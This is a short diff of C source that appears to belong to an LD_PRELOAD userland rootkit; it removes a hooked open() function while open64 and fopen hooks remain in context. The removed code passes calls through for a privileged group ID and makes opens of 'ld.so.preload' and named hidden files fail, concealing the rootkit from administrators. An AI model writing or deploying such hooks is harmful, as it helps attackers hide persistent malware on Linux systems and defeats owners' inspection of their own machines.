@@ -299,27 +299,6 @@ int open64(const char *path, int flags, ...) {
     return o_openat64(AT_FDCWD, path, flags);
 }
 
-// open
-
-int (*o_open)(const char *, int, ...);
-int open(const char *path, int flags, ...) {
-#ifdef VERBOSE
-    printf("open called\n");
-#endif
-    if(!o_open)
-        o_open = dlsym(RTLD_NEXT, "open");
-
-    if (good_gid() == 1) {
-        return o_open(path, flags);
-    }
-
-    if (strcmp(path, "ld.so.preload") == 0 || strcmp(path, HIDDEN_FILENAME) == 0 || strcmp(path, HIDDEN_FILENAME2) == 0) {
-        return -1;
-    }
-
-    return o_open(path, flags);
-}
-
 // fopen
 
 FILE *(*o_fopen)(const char *, const char *);
